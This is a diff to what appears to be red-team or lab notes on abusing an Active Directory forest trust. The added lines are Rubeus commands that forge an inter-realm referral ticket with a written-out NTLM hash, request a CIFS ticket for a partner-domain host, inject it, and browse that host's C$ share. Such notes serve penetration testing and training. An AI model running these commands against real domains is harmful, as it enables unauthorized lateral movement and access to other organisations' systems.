@@ -43,7 +43,23 @@ rev2self
 77057e264522cbf4db45d6733b9167dc
 ```
 
-Forge a refferal ticket offline
+Forge a referral ticket offline or online using the `/ldap` flag
 ```powershell
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /nowrap
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /ldap /nowrap
 ```
+
+Use forged inter-realm ticket to request service tickets for the trusting domain
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /nowrap /ticket: 
+```
+
+Inject ticket into current session and verify
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
+
+run klist
+ls \\par-jmp-1.partner.com\c$
+```
+
